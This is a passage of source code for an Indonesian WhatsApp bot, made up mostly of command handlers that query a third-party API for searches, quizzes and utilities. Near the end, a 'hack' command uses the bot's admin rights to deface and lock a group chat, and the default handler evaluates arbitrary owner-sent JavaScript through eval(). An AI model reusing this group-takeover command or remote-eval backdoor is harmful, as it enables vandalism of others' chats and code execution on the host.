reply(ini_txt)
await confirmLIMIT(sender, [angka])	
                    break
case 'zhappymod':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Happy Mod Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
						ini_txt += `Rating : ${x.rating}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
await sendButtonText(from, ini_txt, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
                    break
case 'ziguser':   // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Happy Mod Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
						ini_txt += `Rating : ${x.rating}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
await sendButtonText(from, ini_txt, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
                    break
					case 'zapkpure':   // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Happy Mod Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
						ini_txt += `Rating : ${x.rating}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
await sendButtonText(from, ini_txt, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
                    break
case 'zkbbi':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} yang mau dicari`)
await replysticker(loadingstc)	
anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
anu1 = `${anu.result}`
sendButtonText(from, anu1, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
await confirmLIMIT(sender, [angka])
                    break
case 'zneonimesearch':   // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Happy Mod Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
						ini_txt += `Rating : ${x.rating}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
await sendButtonText(from, ini_txt, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
                    break
case 'zyts':   // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Happy Mod Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
						ini_txt += `Rating : ${x.rating}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
await sendButtonText(from, ini_txt, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
                    break
case 'zshopee':   
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.data
                ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `harga : ${x.harga}\n`
						ini_txt += `terjual : ${x.terjual}\n`
                        ini_txt += `location : ${x.location}\n`
                        ini_txt += `cover : ${x.cover}\n`	
                        ini_txt += `desc : ${x.desc}\n`	
                        ini_txt += `stock : ${x.stock}\n`	
                        ini_txt += `information : ${x.information}\n`	
                        ini_txt += `url : ${x.url}\n`
                        ini_txt += `img_detail : ${x.img_detail}\n`													
                    }
await sendButtonText(from, ini_txt, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
					await confirmLIMIT(sender, [angka])
                    break
case 'zbrainly':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}&count=1`)
                    get_result = get_result.data
                    ini_txt = 'Brainly Search : \n'
                    for (var x of get_result) {
                        ini_txt += `quesion : ${x.quesion}\n`
                        ini_txt += `answer : ${x.answer.text}\n`
                    }
reply(ini_txt)
await confirmLIMIT(sender, [angka])	
                    break
					case 'zspotify':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.data
                    ini_txt = 'Film Search : \n'
                    for (var x of get_result) {
                        ini_txt += `title : ${x.title}\n`
                        ini_txt += `artists : ${x.artists}\n`
                        ini_txt += `album : ${x.album}\n`
                        ini_txt += `url : ${x.url}\n`
                        ini_txt += `preview_mp3 : ${x.preview_mp3}\n`
                    }
reply(ini_txt)
await confirmLIMIT(sender, [angka])	
                    break
    case 'zgimg':
	    case 'zpinimg':
	
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
ini_url = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`, {method: 'get'})
                    ini_url = ini_url.data
reply(ini_url)
                    break
  case 'ztebakgambar':
if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
  get_result = await  fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`, {method: 'get'})
get_result = get_result.result
soal = get_result.soal
jawaban = get_result.jawaban
tingkat = get_result.tingkat
ini_buffer = await getBuffer(soal)
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z|B|C|D|F|G|H|J|K|L|N|O|P|Q|R|S|T|V|W|X|Y|Z]/gi, ' _ ')
buff = await getBuffer(soal)

client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: `Silahkan jawab soal berikut ini\n\tingkat :${tingkat}\nWaktu : 30s\nPetunjuk :${kisi_kisi}\nWaktu : 30s` }).then(() => {
  tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/group/tebakgambar.json", JSON.stringify(tebakgambar))
})
await sleep(30000)
if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  titid = "*Jawaban*: " + jawaban
await sendButtonText(from, titid, `Klik Untuk Ke Game Selanjutnya`, [{buttonId: `ztebakgambar`,buttonText: {displayText: `TRY AGAIN`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
  delete tebakgambar[sender.split('@')[0]]
  fs.writeFileSync("./database/group/tebakgambar.json", JSON.stringify(tebakgambar))
}
break
 case 'zsiapaaku':
if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
  get_result = await  fetchJson(`https://api.zeks.me/api/siapa-aku?apikey=${ZeksApiku}&q=${q}`, {method: 'get'})
get_result = get_result.data
soal = get_result.soal
jawaban = get_result.jawaban
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z|B|C|D|F|G|H|J|K|L|N|O|P|Q|R|S|T|V|W|X|Y|Z]/gi, ' _ ')
  titida = `${soal}\n${kisi_kisi}`
client.sendMessage(from, titida, text, { quoted: mek}).then(() => {
  tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/group/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
})
await sleep(30000)
if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
  titid = "*Jawaban*: " + jawaban
await sendButtonText(from, titid, `Klik Untuk Ke Game Selanjutnya`, [{buttonId: `ztebakgambar`,buttonText: {displayText: `TRY AGAIN`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
  delete tebaksiapaaku[sender.split('@')[0]]
  fs.writeFileSync("./database/group/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
}
break
 case 'zcaklontong':
if (tebakcaklontong.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
  get_result = await  fetchJson(`https://api.zeks.me/api/cak-lontong?apikey=${ZeksApiku}&q=${q}`, {method: 'get'})
get_result = get_result.data
soal = get_result.soal
jawaban = get_result.jawaban
keterangan = get_result.keterangan
kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z|B|C|D|F|G|H|J|K|L|N|O|P|Q|R|S|T|V|W|X|Y|Z]/gi, ' _ ')
  titida = `${soal}\n${kisi_kisi}`
client.sendMessage(from, titida, text, { quoted: mek}).then(() => {
  tebakcaklontong[sender.split('@')[0]] = jawaban.toLowerCase()
  fs.writeFileSync("./database/group/tebakcaklontong.json", JSON.stringify(tebakcaklontong))
})
await sleep(30000)
if (tebakcaklontong.hasOwnProperty(sender.split('@')[0])) {
  console.log(color("Jawaban: " + jawaban))
titid = `*Jawaban*:  ${jawaban}  ${keterangan}`
await sendButtonText(from, titid, `Klik Untuk Ke Game Selanjutnya`, [{buttonId: `ztebakgambar`,buttonText: {displayText: `TRY AGAIN`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
  delete tebakcaklontong[sender.split('@')[0]]
  fs.writeFileSync("./database/group/tebakcaklontong.json", JSON.stringify(tebakcaklontong))
}
break
	 case 'zaaartimimpi':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
const sdasda = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation					   
			        anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${sdasda}`)
			        mimpi = `${anu.result.string}`
			        client.sendMessage(from, mimpi, text, {quoted: mek})
					await confirmLIMIT(sender, [angka])
			       	break 
	case 'zartimimpi':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
			        anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
			        mimpi = `${anu.result.string}`
			        client.sendMessage(from, mimpi, text, {quoted: mek})
					await confirmLIMIT(sender, [angka])
			       	break 
	 case 'zartinama':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
			        anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&nama=${q}`)
					reply(anu.result)
					await confirmLIMIT(sender, [angka])
			       	break 
	 case 'zprimbonjodoh':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
					   var tex1 = q.split('.')[0]
var tex2 = q.split('.')[1]
if (!tex2) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} text.text`)
			        anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&nama1=${tex1}&nama2=${tex2}`)
anu1 = `*thumb* : ${anu.result.thumb}\n*positif* : ${anu.result.positif}\n*negatif* : ${anu.result.negatif}`
reply(anu1)
await confirmLIMIT(sender, [angka])
break 
	 case 'zjadwalsholat':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
			        anu = await await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&daerah=${q}`)
			        mimpi = `${anu.data.string}`
			        client.sendMessage(from, mimpi, text, {quoted: mek})
					await confirmLIMIT(sender, [angka])
			       	break  
	 case 'ztts':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
var tex1 = q.split('.')[0]
var tex2 = q.split('.')[1]
if (!tex2) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} (pilih kode bahasa di ${prefix}bahasa).teks`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&code=${tex1}&text=${tex2}`, {method: 'get'})
client.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', quoted: mek, ptt:true})
					await confirmLIMIT(sender, [angka])
			       	break
	 case 'zurlshort-all':
	 
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
			        anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&url=${q}`)
					reply(`${anu.result_1}\n${anu.result_2}\n${anu.result_3}`)
					await confirmLIMIT(sender, [angka])
			       	break 
	 case 'zurlshort':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
			        anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&url=${q}`)
					reply(anu.result)
					await confirmLIMIT(sender, [angka])
			       	break 
		 case 'zjadwaltv':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
			        anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&channel=${q}`)
					reply(anu.result)
					await confirmLIMIT(sender, [angka])
			       	break
	 case 'zytmp3':
 if (!isRegistered) return reply(ind.noregis())
				   if (isBanned) return reply(ind.baned())
				   if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&code=${q}`, {method: 'get'})
anu1 = await getBuffer(`${q}`)
client.sendMessage(from, anu1, audio, {mimetype: 'audio/mp4', quoted: mek, ptt:true, filename: `test.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					await confirmLIMIT(sender, [angka])
			       	break
				   case 'viewonce':

if (!isRegistered) return sendButtonNotRegis(from)
res = await client.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": "",
"viewOnce": true
}
}
}
}, {}) 
client.relayWAMessage(res)
break
case 'restart':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
						reply('Okey')
				return client.sendMessage(from, JSON.stringify(eval(process.exit())))
				
				break
case 'hack':

if (!isOwner) return
if (!isBotGroupAdmins) return
if (!isGroup) return
anu = fs.readFileSync('strg/image/gaklah.jpeg')
client.updateProfilePicture(from, anu)
client.groupUpdateSubject(from, `Hacked Siegrin`)
client.groupUpdateDescription(from, `Mampos Gw Kudet`)
client.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
reply('Mwuehehe kena hack kacian')
}, 8000)
break
					
default:
const partiNum = (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.contextInfo.participant : ''
// Antitag Via Reply 
if (own.includes(partiNum)) {
if (antitags === false) return
if (!isGroup) return 
if (mek.key.fromMe) return
if (isOwner) return
replysticker(needownstc)
}
		
if (budy.startsWith('x')){
try {
if (!isOwner) return replysticker(ownerstc)
return client.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!isOwner) return replysticker(ownerstc)
return client.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

	}
		
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
            if (!e.includes("Cannot set property 'mtype' of undefined")) {
            if (!e.includes("jid is not defined")) {
     console.log(color('|ERR|', 'red'), color(e, 'cyan'))
     client.sendMessage(ow, `──「 *ALERT-ERROR* 」──\n\n\`\`\`${e}\`\`\`\n\n────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Developer ${fake}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./src/siegrin.jpeg'),sourceUrl: `${mybio}`}}})
	}
    }
    }
    }
    }
    }
}


	
    
